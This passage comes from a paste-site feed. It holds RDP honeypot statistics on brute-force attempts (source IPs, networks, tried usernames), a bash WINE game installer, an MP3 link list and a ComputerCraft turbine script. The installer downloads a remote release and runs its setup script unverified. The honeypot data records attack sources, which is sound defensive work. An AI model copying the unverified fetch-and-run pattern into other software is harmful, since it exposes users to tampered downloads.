    ""185.237.252.51"": 4,
    ""185.198.69.17"": 2,
    ""185.198.69.2"": 2
  },
  ""asn"": {
    ""AS18403"": 1384,
    ""AS209588"": 10,
    ""AS57523"": 18,
    ""AS7713"": 6,
    ""AS133676"": 4,
    ""AS14061"": 8,
    ""AS135905"": 2,
    ""AS398324"": 2,
    ""AS396982"": 26,
    ""AS208091"": 32,
    ""AS204428"": 10,
    ""AS59425"": 12,
    ""AS63949"": 10,
    ""AS197414"": 4,
    ""AS267784"": 10,
    ""AS8075"": 2,
    ""AS62240"": 4,
    ""AS20473"": 2,
    ""AS48721"": 10,
    ""AS9658"": 18,
    ""AS140810"": 6,
    ""AS45899"": 2,
    ""AS45804"": 2,
    ""AS16276"": 2,
    ""AS135377"": 2,
    ""AS37963"": 2,
    ""AS210950"": 6,
    ""AS174"": 2,
    ""AS16509"": 4,
    ""AS51167"": 4
  },
  ""isp"": {
    ""Vietnam Internet Network Information Center"": 1384,
    ""Flyservers S.A."": 30,
    ""Chang Way Technologies Co. Limited"": 18,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Precious netcom pvt ltd"": 4,
    ""DigitalOcean, LLC"": 6,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Censys, Inc."": 2,
    ""Google LLC"": 26,
    ""Xhost Internet Solutions LP"": 30,
    ""SS-Net"": 10,
    ""Horizon LLC"": 12,
    ""Akamai Technologies, Inc."": 10,
    ""Microsoft Corporation"": 2,
    ""LogicWeb Inc."": 2,
    ""Choopa"": 2,
    ""Eastern Telecommunications Philippines, Inc."": 18,
    ""MAYTINHVPSTTT"": 6,
    ""VNPT"": 2,
    ""Meghbela Cable & Broadband Services (P) Ltd"": 2,
    ""Clouvider Limited"": 2,
    ""OVH SAS"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""DIGITALOCEAN"": 2,
    ""TOV E-RISHENNYA"": 6,
    ""Cogent Communications"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Amazon.com, Inc."": 4,
    ""Contabo GmbH"": 4
  },
  ""org"": {
    ""Everest Global Joint Stock Company"": 1384,
    ""Alviva Holding Limited"": 10,
    ""Starcrecium Limited"": 2,
    ""Telekomunikasi Indonesia"": 6,
    ""Gstech Software Systems Pvt Ltd"": 4,
    ""DigitalOcean, LLC"": 4,
    ""VNPT"": 2,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 26,
    ""4Media Ltd"": 10,
    ""Horizon LLC"": 12,
    ""Akamai Technologies, Inc."": 10,
    ""Xhostis"": 4,
    ""UAB Host Baltic"": 10,
    ""Microsoft Azure Cloud (southeastasia)"": 2,
    ""Dedicated Servers"": 2,
    ""Vultr Holdings, LLC"": 2,
    ""Flyservers S.A"": 10,
    ""DSL Network"": 18,
    ""Vpsttt Computer Company Limited"": 6,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Newmeghbelamcc"": 2,
    ""IPXO"": 2,
    ""Digitalocean"": 4,
    ""OVH Ltd"": 2,
    ""Ucloud Information Technology"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""Google Cloud (us-central1)"": 2,
    ""TOV VAIZ PARTNER"": 6,
    ""BlackHOST Ltd."": 2,
    ""Chang Way Technologies Co. Limited"": 16,
    ""XHOSTIS"": 6,
    ""AWS EC2 (ap-northeast-2)"": 4,
    ""Contabo GmbH"": 4
  },
  ""regionName"": {
    ""Hanoi"": 1388,
    ""Hesse"": 10,
    ""Moscow"": 30,
    ""Jakarta"": 6,
    ""National Capital Territory of Delhi"": 4,
    ""South West"": 6,
    ""Michigan"": 2,
    ""California"": 40,
    ""North Holland"": 38,
    ""Plovdiv"": 10,
    ""Vilnius"": 10,
    ""Central Singapore"": 2,
    ""Kaunas"": 10,
    ""Metro Manila"": 18,
    ""Ho Chi Minh"": 6,
    ""West Bengal"": 2,
    ""England"": 4,
    ""Lagos"": 2,
    ""Beijing"": 2,
    ""Iowa"": 2,
    ""Kyiv City"": 6,
    ""Seoul"": 4,
    ""North Rhine-Westphalia"": 4
  },
  ""country"": {
    ""Vietnam"": 1394,
    ""Germany"": 14,
    ""Russia"": 30,
    ""Indonesia"": 6,
    ""India"": 6,
    ""Singapore"": 8,
    ""United States"": 44,
    ""The Netherlands"": 38,
    ""Bulgaria"": 10,
    ""Lithuania"": 20,
    ""Philippines"": 18,
    ""United Kingdom"": 4,
    ""Nigeria"": 2,
    ""China"": 2,
    ""Ukraine"": 6,
    ""South Korea"": 4
  },
  ""account"": {
    ""hello"": 1446,
    ""Administr"": 66,
    ""Test"": 32,
    ""(empty)"": 8,
    ""LmeVbFgnY"": 2,
    ""icpxLN"": 2,
    ""IaixQg"": 2,
    ""CnWsvacyx"": 2,
    ""danALU"": 2,
    ""ijAGne"": 2,
    ""Administrator"": 2,
    ""DwpNmDKwI"": 2,
    ""CLoyJg"": 2,
    ""RupRYB"": 2,
    ""Domain"": 26,
    ""root"": 2,
    ""JtieJUhiv"": 2,
    ""cWtxdC"": 2,
    ""ViSGoj"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1606
  },
  ""client_build"": {
    ""Unknown"": 1606
  },
  ""client_name"": {
    ""Unknown"": 1606
  },
  ""ip_type"": {
    ""Unknown"": 1518,
    ""proxy"": 20,
    ""hosting & proxy"": 4,
    ""hosting"": 60,
    ""mobile"": 2,
    ""mobile & hosting"": 2
  }
}"
GGncVLc5,2024-03-01_stats.json,rdp_snitch,JSON,Friday 1st of March 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""103.143.207.200"": 692,
    ""92.51.2.11"": 1,
    ""185.122.204.179"": 1,
    ""36.91.222.100"": 3,
    ""103.47.73.122"": 2,
    ""143.198.220.26"": 1,
    ""14.225.67.151"": 1,
    ""167.248.133.53"": 1,
    ""205.210.31.109"": 3,
    ""87.251.75.145"": 3,
    ""212.70.149.142"": 4,
    ""62.204.41.107"": 6,
    ""172.233.158.124"": 5,
    ""185.170.144.3"": 2,
    ""45.227.254.49"": 2,
    ""52.237.107.92"": 1,
    ""98.159.37.36"": 1,
    ""45.32.134.97"": 1,
    ""45.227.254.9"": 1,
    ""194.165.16.10"": 3,
    ""80.66.76.92"": 8,
    ""198.235.24.50"": 3,
    ""49.157.61.150"": 9,
    ""103.238.234.204"": 3,
    ""14.191.56.150"": 1,
    ""43.251.176.141"": 1,
    ""216.24.210.203"": 1,
    ""178.128.95.38"": 2,
    ""51.77.108.29"": 1,
    ""152.32.141.202"": 1,
    ""205.210.31.239"": 3,
    ""123.56.20.194"": 1,
    ""87.251.75.179"": 2,
    ""81.19.135.147"": 1,
    ""139.59.181.152"": 1,
    ""212.70.149.146"": 1,
    ""34.29.132.207"": 1,
    ""81.19.135.2"": 3,
    ""194.165.16.37"": 2,
    ""45.143.201.20"": 3,
    ""185.142.236.34"": 1,
    ""185.198.69.11"": 1,
    ""185.198.69.19"": 1,
    ""45.227.254.54"": 2,
    ""205.210.31.72"": 3,
    ""193.37.69.150"": 3,
    ""185.198.69.9"": 1,
    ""185.198.69.29"": 1,
    ""185.198.69.15"": 1,
    ""43.202.64.24"": 2,
    ""185.198.69.28"": 1,
    ""185.237.252.51"": 2,
    ""185.198.69.17"": 1,
    ""185.198.69.2"": 1
  },
  ""asn"": {
    ""AS18403"": 692,
    ""AS209588"": 5,
    ""AS57523"": 9,
    ""AS7713"": 3,
    ""AS133676"": 2,
    ""AS14061"": 4,
    ""AS135905"": 1,
    ""AS398324"": 1,
    ""AS396982"": 13,
    ""AS208091"": 16,
    ""AS204428"": 5,
    ""AS59425"": 6,
    ""AS63949"": 5,
    ""AS197414"": 2,
    ""AS267784"": 5,
    ""AS8075"": 1,
    ""AS62240"": 2,
    ""AS20473"": 1,
    ""AS48721"": 5,
    ""AS9658"": 9,
    ""AS140810"": 3,
    ""AS45899"": 1,
    ""AS45804"": 1,
    ""AS16276"": 1,
    ""AS135377"": 1,
    ""AS37963"": 1,
    ""AS210950"": 3,
    ""AS174"": 1,
    ""AS16509"": 2,
    ""AS51167"": 2
  },
  ""isp"": {
    ""Vietnam Internet Network Information Center"": 692,
    ""Flyservers S.A."": 15,
    ""Chang Way Technologies Co. Limited"": 9,
    ""PT Telekomunikasi Indonesia"": 3,
    ""Precious netcom pvt ltd"": 2,
    ""DigitalOcean, LLC"": 3,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Censys, Inc."": 1,
    ""Google LLC"": 13,
    ""Xhost Internet Solutions LP"": 15,
    ""SS-Net"": 5,
    ""Horizon LLC"": 6,
    ""Akamai Technologies, Inc."": 5,
    ""Microsoft Corporation"": 1,
    ""LogicWeb Inc."": 1,
    ""Choopa"": 1,
    ""Eastern Telecommunications Philippines, Inc."": 9,
    ""MAYTINHVPSTTT"": 3,
    ""VNPT"": 1,
    ""Meghbela Cable & Broadband Services (P) Ltd"": 1,
    ""Clouvider Limited"": 1,
    ""OVH SAS"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""DIGITALOCEAN"": 1,
    ""TOV E-RISHENNYA"": 3,
    ""Cogent Communications"": 1,
    ""Xhost Internet Solutions"": 3,
    ""Amazon.com, Inc."": 2,
    ""Contabo GmbH"": 2
  },
  ""org"": {
    ""Everest Global Joint Stock Company"": 692,
    ""Alviva Holding Limited"": 5,
    ""Starcrecium Limited"": 1,
    ""Telekomunikasi Indonesia"": 3,
    ""Gstech Software Systems Pvt Ltd"": 2,
    ""DigitalOcean, LLC"": 2,
    ""VNPT"": 1,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 13,
    ""4Media Ltd"": 5,
    ""Horizon LLC"": 6,
    ""Akamai Technologies, Inc."": 5,
    ""Xhostis"": 2,
    ""UAB Host Baltic"": 5,
    ""Microsoft Azure Cloud (southeastasia)"": 1,
    ""Dedicated Servers"": 1,
    ""Vultr Holdings, LLC"": 1,
    ""Flyservers S.A"": 5,
    ""DSL Network"": 9,
    ""Vpsttt Computer Company Limited"": 3,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Newmeghbelamcc"": 1,
    ""IPXO"": 1,
    ""Digitalocean"": 2,
    ""OVH Ltd"": 1,
    ""Ucloud Information Technology"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""Google Cloud (us-central1)"": 1,
    ""TOV VAIZ PARTNER"": 3,
    ""BlackHOST Ltd."": 1,
    ""Chang Way Technologies Co. Limited"": 8,
    ""XHOSTIS"": 3,
    ""AWS EC2 (ap-northeast-2)"": 2,
    ""Contabo GmbH"": 2
  },
  ""regionName"": {
    ""Hanoi"": 694,
    ""Hesse"": 5,
    ""Moscow"": 15,
    ""Jakarta"": 3,
    ""National Capital Territory of Delhi"": 2,
    ""South West"": 3,
    ""Michigan"": 1,
    ""California"": 20,
    ""North Holland"": 19,
    ""Plovdiv"": 5,
    ""Vilnius"": 5,
    ""Central Singapore"": 1,
    ""Kaunas"": 5,
    ""Metro Manila"": 9,
    ""Ho Chi Minh"": 3,
    ""West Bengal"": 1,
    ""England"": 2,
    ""Lagos"": 1,
    ""Beijing"": 1,
    ""Iowa"": 1,
    ""Kyiv City"": 3,
    ""Seoul"": 2,
    ""North Rhine-Westphalia"": 2
  },
  ""country"": {
    ""Vietnam"": 697,
    ""Germany"": 7,
    ""Russia"": 15,
    ""Indonesia"": 3,
    ""India"": 3,
    ""Singapore"": 4,
    ""United States"": 22,
    ""The Netherlands"": 19,
    ""Bulgaria"": 5,
    ""Lithuania"": 10,
    ""Philippines"": 9,
    ""United Kingdom"": 2,
    ""Nigeria"": 1,
    ""China"": 1,
    ""Ukraine"": 3,
    ""South Korea"": 2
  },
  ""account"": {
    ""hello"": 723,
    ""Administr"": 33,
    ""Test"": 16,
    ""(empty)"": 4,
    ""LmeVbFgnY"": 1,
    ""icpxLN"": 1,
    ""IaixQg"": 1,
    ""CnWsvacyx"": 1,
    ""danALU"": 1,
    ""ijAGne"": 1,
    ""Administrator"": 1,
    ""DwpNmDKwI"": 1,
    ""CLoyJg"": 1,
    ""RupRYB"": 1,
    ""Domain"": 13,
    ""root"": 1,
    ""JtieJUhiv"": 1,
    ""cWtxdC"": 1,
    ""ViSGoj"": 1
  },
  ""keyboard"": {
    ""Unknown"": 803
  },
  ""client_build"": {
    ""Unknown"": 803
  },
  ""client_name"": {
    ""Unknown"": 803
  },
  ""ip_type"": {
    ""Unknown"": 759,
    ""proxy"": 10,
    ""hosting & proxy"": 2,
    ""hosting"": 30,
    ""mobile"": 1,
    ""mobile & hosting"": 1
  }
}"
1hTM3WJ1,Game Installer Script (v2.5) Based on JC141 Script,EvilSupahFly,Bash,Friday 1st of March 2024 05:59:28 PM CDT,"#!/bin/bash
#
# V2.5 of my Game Installer Script Based on the original JC141 Script as it appeared in BG3.
# Assumes multiple games are stored in conveniently-named subdirectories with a 'setup.exe' in them, and
# takes a folder name on the command line, creates all the applicable directories and a WINE prefix for
# it, downloads and installs, the newest version of VULKAN, starts the setup.exe located in the folder
# provided on the command line, and writes a version of the installer script out as the game start script.
#
# Changes from v2.0:
# - Added a loop to locate any "".exe"" files in $GAMEDIR and store them in an array, print array as numbered list, ask user to
#   select a listed "".exe"" and write it to $GSS, verified with error-checking.
# - Modified MSVC loop
# TO DO in v3:
# - Add colour to prompts and output (probably) (!still!)
 
# Basic checks
IFS=$'\n'
# Basic checks
cd ""$(dirname ""$(readlink -f ""$0"")"")"" || exit; [ ""$EUID"" = ""0"" ] && echo ""Please don't run as root!"" && exit; [ ""$1"" = """" ] && echo ""Command line can't be blank - please choose a game."" && exit

if [ ! -d ""$1"" ]; then
    echo ""I can't find \""$1\"" in this folder.""
    exit 255
elif [ ! -f ""$1/setup.exe"" ]; then
    echo ""\""$1\"" doesn't have a \""setup.exe\"" installer.""
    exit 255
fi

# Declarations
export G=""${1// /_}""
export GAMESRC=""$PWD/$1""
export WINEPREFIX=""/home/$(whoami)/Games/jc141"" #Create Wineprefix
export GAMEDIR=""$WINEPREFIX/drive_c/Games/$1""
[ ! -d ""$GAMEDIR"" ] && mkdir -p ""$GAMEDIR"" #If $GAMEDIR doesn't exist, create it
export GSS=""$WINEPREFIX/drive_c/${G}.sh"" #Convert spaces to underscores, if they exist, for the launcher script
export RSRC=""$PWD/redist""
export WINE=""$(command -v wine)""
export WINEDLLOVERRIDES=""winemenubuilder.exe=d;mshtml=d;nvapi,nvapi64=n""
export WINE_LARGE_ADDRESS_AWARE=1

echo """"
echo ""Declarations:""
echo """"
echo ""G=\""${1// /_}\""""
echo ""GAMESRC=\""$PWD/$1\""""
echo ""WINEPREFIX=\""/home/$(whoami)/Games/jc141\""""
echo ""GAMEDIR=\""$WINEPREFIX/drive_c/Games""
echo ""GSS=\""$WINEPREFIX/drive_c/${G}.sh\""""
echo ""RSRC=\""$PWD/redist\""""
echo ""WINE=\""$(command -v wine)\""""
echo ""WINEDLLOVERRIDES=\""winemenubuilder.exe=d;mshtml=d;nvapi,nvapi64=n\""""
echo """"
echo ""Variables Declared. Starting Vulkan setup.""
echo """"
echo """"

# external vulkan translation
#export DXVK_ASYNC=1

ping -c 1 github.com >/dev/null || { echo ""Possibly no network. This may mean that booting will fail."" ; }; VLKLOG=""$WINEPREFIX/vulkan.log""; VULKAN=""$PWD/vulkan""
VLKVER=""$(curl -s -m 5 https://api.github.com/repos/jc141x/vulkan/releases/latest | awk -F '[""/]' '/""browser_download_url"":/ {print $11}' | cut -c 1-)""
status-vulkan() { [[ ! -f ""$VLKLOG"" || -z ""$(awk ""/^${FUNCNAME[1]}\$/ {print \$1}"" ""$VLKLOG"" 2>/dev/null)"" ]] || { echo ""${FUNCNAME[1]} present"" && return 1; }; }
vulkan() { DL_URL=""$(curl -s https://api.github.com/repos/jc141x/vulkan/releases/latest | awk -F '[""]' '/""browser_download_url"":/ {print $4}')""; VLK=""$(basename ""$DL_URL"")""
[ ! -f ""$VLK"" ] && command -v curl >/dev/null 2>&1 && curl -LO ""$DL_URL"" && tar -xvf ""vulkan.tar.xz"" || { rm ""$VLK"" && echo ""ERROR: Failed to extract vulkan translation."" && return 1; }
rm -rf ""vulkan.tar.xz"" && bash ""$PWD/vulkan/setup-vulkan.sh"" && rm -Rf ""$VULKAN""; }
vulkan-dl() { echo ""Using external vulkan translation (dxvk,vkd3d,dxvk-nvapi)."" && vulkan && echo ""$VLKVER"" >""$VLKLOG""; }
[[ ! -f ""$VLKLOG"" && -z ""$(status-vulkan)"" ]] && vulkan-dl;
[[ -f ""$VLKLOG"" && -n ""$VLKVER"" && ""$VLKVER"" != ""$(awk '{print $1}' ""$VLKLOG"")"" ]] && { rm -f vulkan.tar.xz || true; } && vulkan-dl; export DXVK_ENABLE_NVAPI=1

echo """"
if [ ""$2"" == ""skip"" ]
then
    YN=""n""
else
    read -p ""Install MSVC redistributables? (y/n) "" YN
fi
echo """"
case $YN in
    [yY] ) echo ""Proceeding with install."";
      cd ""$RSRC"";
      for i in *.exe;
        do
            echo ""Installing $i into $WINEPREFIX"";
            ""$WINE"" ""$i""; 
        done;;
    [nN] ) echo ""Skipping redistributables. Don't blame me if something breaks."";;
    * ) echo ""Invalid response."";
        break;;
esac

# start installer
echo """"
echo ""Starting \""$1\"" installer...""
echo """"

cd ""$GAMESRC""
""$WINE"" ""setup.exe"" ""$@""

sleep 5

EXELIST=( $(find $GAMEDIR -type f -name ""*.exe"") )
PS3=""Select game executable from the list below: ""

echo """"
i=0;
while [ $i -lt ${#EXELIST[@]} ]; do
    echo ""$i: ${EXELIST[$i]}""
    ((i++))
done

select file in ""${EXELIST[@]}""; do
    if [[ -z $file ]]; then
        echo ""Uh... Excuse me? Let's try that again."" >&2
    else
        echo """"
        echo ""You've selected: \""$file\""""
        echo """"
        sleep 10
        break
    fi
    
done

echo """"
echo ""Writing Game Starter Script (GSS) for $1 to $GSS ...""
echo """"

#create game starter script
cat << EOL > ""$GSS""
#!/bin/bash

# $GSS #

cd ""\$(dirname ""\$(readlink -f ""\$0"")"")"" || exit; [ ""\$EUID"" = ""0"" ] && echo ""Please don't run as root!"" && exit

# wine
export WINE=""\$(command -v wine)"";
export WINEPREFIX=""/home/\$(whoami)/Games/jc141""; export WINEDLLOVERRIDES=""winemenubuilder.exe=d;mshtml=d;nvapi,nvapi64=n""
export WINE_LARGE_ADDRESS_AWARE=1;
export GAMEDIR=""\$WINEPREFIX/drive_c/Games/$1""

# external vulkan translation
#export DXVK_ASYNC=1

ping -c 1 github.com >/dev/null || { echo ""Possibly no network. This may mean that booting will fail."" ; }; VLKLOG=""\$WINEPREFIX/vulkan.log""; VULKAN=""\$PWD/vulkan""
VLKVER=""\$(curl -s -m 5 https://api.github.com/repos/jc141x/vulkan/releases/latest | awk -F '[""/]' '/""browser_download_url"":/ {print \$11}' | cut -c 1-)""
status-vulkan() { [[ ! -f ""\$VLKLOG"" || -z ""\$(awk ""/^\${FUNCNAME[1]}\$/ {print \$1}"" ""\$VLKLOG"" 2>/dev/null)"" ]] || { echo ""\${FUNCNAME[1]} present"" && return 1; }; }
vulkan() { DL_URL=""\$(curl -s https://api.github.com/repos/jc141x/vulkan/releases/latest | awk -F '[""]' '/""browser_download_url"":/ {print \$4}')""; VLK=""\$(basename ""\$DL_URL"")""
[ ! -f ""\$VLK"" ] && command -v curl >/dev/null 2>&1 && curl -LO ""\$DL_URL"" && tar -xvf ""vulkan.tar.xz"" || { rm ""\$VLK"" && echo ""ERROR: Failed to extract vulkan translation."" && return 1; }
rm -rf ""vulkan.tar.xz"" && bash ""\$PWD/vulkan/setup-vulkan.sh"" && rm -Rf ""\$VULKAN""; }
vulkan-dl() { echo ""Using external vulkan translation (dxvk,vkd3d,dxvk-nvapi)."" && vulkan && echo ""\$VLKVER"" >""\$VLKLOG""; }
[[ ! -f ""\$VLKLOG"" && -z ""\$(status-vulkan)"" ]] && vulkan-dl;
[[ -f ""\$VLKLOG"" && -n ""\$VLKVER"" && ""\$VLKVER"" != ""\$(awk '{print \$1}' ""\$VLKLOG"")"" ]] && { rm -f vulkan.tar.xz || true; } && vulkan-dl

# start
export DXVK_ENABLE_NVAPI=1
cd ""\$GAMEDIR""
""\$WINE"" ""$file"" ""\$@""
EOL

chmod a+x ""$GSS""
echo """"
cat $GSS
echo """"
echo ""\""$GSS\"" written and made executable.""
echo """"

echo """"
echo ""Path of the $1 wineprefix is: $WINEPREFIX""
echo """"
echo ""Be sure to verify that the game executable I listed in \""$GSS\"" is actually \""$file\"" and modify if necessary.""
echo """""
adTGcwHJ,Review Pastes.io [Pastebin Alternative],xxsa,PHP,Friday 1st of March 2024 05:46:03 PM CDT,https://pastes.io - Paste Tool - Pastebin Alternative.
SjMc8QPx,01 2024,spidersam,JSON,Friday 1st of March 2024 05:38:00 PM CDT,"[
  {
    ""name"": ""Zoo-08-01-2024-Compilation-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/bcc39e41-952c-00fc-235b-bbdad3c6609a.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-09-01-2024-Compilation-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/0e4a31f4-c037-2fff-b799-680ca47d3287.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-10-01-2024-Compilation-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/bf262084-1cd9-644b-6460-58ba4fcc2d89.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-11-01-2024-Compilation-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/1ba1fc89-327e-cf82-56c1-b06b9f21362f.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-12-01-2024-Compilation-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/e55ce1b5-5ce5-db8e-fe60-1e0d8cb23c9b.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-15-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/71b92907-1e8c-0da0-f2fb-bc25c13eb261.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-16-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/74f796e8-f945-c47d-d6d7-f484c4d18ca4.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-17-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/f7fc1064-5287-f309-e86c-a8283a4bda27.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-18-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/d0b2dbd4-8344-a8de-c5a1-72773ac624a3.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-19-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/8acb22ed-8953-bb93-b7b3-162a0d66ddd5.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-22-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/ba09939b-51ac-72cf-64b8-9379ec257bd1.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-23-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/d388dbc6-c454-b0d7-a5d2-33c6133278b0.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-24-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/cd1e4677-9759-8799-77b8-a97e2d313b89.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-25-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/d57d375d-4a5a-51ca-e789-fd49a0bde804.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-29-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/3ab87a83-6216-c9c8-1752-15d549974077.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-30-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/02d889f4-0d9b-7322-ef23-35530f6ff1c0.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  },
  {
    ""name"": ""Zoo-31-01-2024-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2024-0-31/e2f5aa76-b690-1076-2e96-ed7d630d0e3b.mp3"",
    ""imageUrl"": ""https://i.imgur.com/aCy3drum.jpeg""
  }
]"
Dz53HBn7,turbina2,Aguia_016,Lua,Friday 1st of March 2024 05:20:29 PM CDT,"local args = { ... }
 
local button = {}
local filleds = {}
local boxes = {}
local lines = {}
local texts = {}
 
local refresh = true

local controlsSize = {}
local numbersSize = {}
local currentRfTotal = 1
local currentRfTick = 1
local currentFuelConsumedLastTick = 0.00001
 
 
local rfPerTickMax = 1
local rfTotalMax = 10000000
local minPowerRod = 0
local maxPowerRod = 100
local currentRodLevel = 1
 
local index = """"
 
local turbines = {}
local monitors = {}
 
local VERSION = ""NONE""
 
function checkVersionTooOld()
    local uselessMonitors = {peripheral.find(""monitor"")}
end
 
function checkMBFunctionAvailability()
    local uselessMbConnected = turbines[1].mbIsConnected()
    local uselessMbAssembled = turbines[1].mbIsAssembled()
end
 
function checkEnergyCapacityFunction()
    local uselessEnergyCapacity = turbines[1].getEnergyStats().energyCapacity
end
 
-- VERSIONS - BIG, EXTREME, BIGGERv1, BIGGERv2
function initturbine()
    if pcall(checkVersionTooOld) then
        monitors = {peripheral.find(""monitor"")}
 
        -- allow 5 seconds to detect if the turbine is on the network
        print(""Detecting turbine. This may take up to 5 seconds."")
        local looptyloop = 0
        while looptyloop ~= 5 do
            if peripheral.find(""Bigturbines-turbine"") ~= nil then
                turbines = {peripheral.find(""Bigturbines-turbine"")}
                if pcall(checkEnergyCapacityFunction) then
                    rfTotalMax = turbines[1].getEnergyStats().energyCapacity
                end
                if pcall(checkMBFunctionAvailability) then
                    VERSION = ""EXTREME""
                else 
                    VERSION = ""BIG""
                end
                break
            elseif peripheral.find(""bigger-turbine"") ~= nil then
                turbines = {peripheral.find(""bigger-turbine"")}
                VERSION = ""BIGGERv1""
                break
            elseif peripheral.find(""Biggerturbines_turbine"") ~= nil then
                turbines = {peripheral.find(""Biggerturbines_turbine"")}
                VERSION = ""BIGGERv2""
                rfTotalMax = turbines[1].battery().capacity()
                break
            end
 
            sleep(1)
            looptyloop = looptyloop + 1
        end
 
        if monitors[1] == nil then
            error(""The Monitor is not being detected, make sure the connections(modem) are activated"", 0)
        end
 
        if turbines[1] == nil then
            error(""The turbine is not being detected, make sure the connections(modem) are activated. The problem could also be related to chunk protection on some public servers, ask an admin about it."", 0)
        end
    else
        error(""The version of ComputerCraft is too old to use this program, sorry"", 0)
    end
    print(""turbine detected. Program Starting."")
end
 
if (#args == 0) then
    error(""No index Given, Make sure to start the 'start' program and not the 'turbine' program"", 0)
end
 
if (#args == 1) then
    index = args[1]
end
 
initturbine() -- Init and Verify that everything is okay to start the program
 
local mon = monitors[1]
 
-- Use the black thingy sponge to clear the chalkboard
 
term.redirect(mon)
mon.clear()
mon.setTextColor(colors.white)
mon.setBackgroundColor(colors.black)
 
function clearTable()
    button = {}
end
 
 
-- All the things that make my buttons work
 
function setButton(name, title, func, xmin, ymin, xmax, ymax, elem, elem2, color)
    button[name] = {}
    button[name][""title""] = title
    button[name][""func""] = func
    button[name][""active""] = false
    button[name][""xmin""] = xmin
    button[name][""ymin""] = ymin
    button[name][""xmax""] = xmax
    button[name][""ymax""] = ymax
    button[name][""color""] = color
    button[name][""elem""] = elem
    button[name][""elem2""] = elem2
end
 
-- stuff and things for buttons
 
function fill(text, color, bData)
   mon.setBackgroundColor(color)
   mon.setTextColor(colors.white)
   local yspot = math.floor((bData[""ymin""] + bData[""ymax""]) /2)
   local xspot = math.floor((bData[""xmax""] - bData[""xmin""] - string.len(bData[""title""])) /2) +1
   for j = bData[""ymin""], bData[""ymax""] do
      mon.setCursorPos(bData[""xmin""], j)
      if j == yspot then
         for k = 0, bData[""xmax""] - bData[""xmin""] - string.len(bData[""title""]) +1 do
            if k == xspot then
               mon.write(bData[""title""])
            else
               mon.write("" "")
            end
         end
      else
         for i = bData[""xmin""], bData[""xmax""] do
            mon.write("" "")
         end
      end
   end
   mon.setBackgroundColor(colors.black)
end
 
-- stuff and things for buttons
 
function screen()
   local currColor
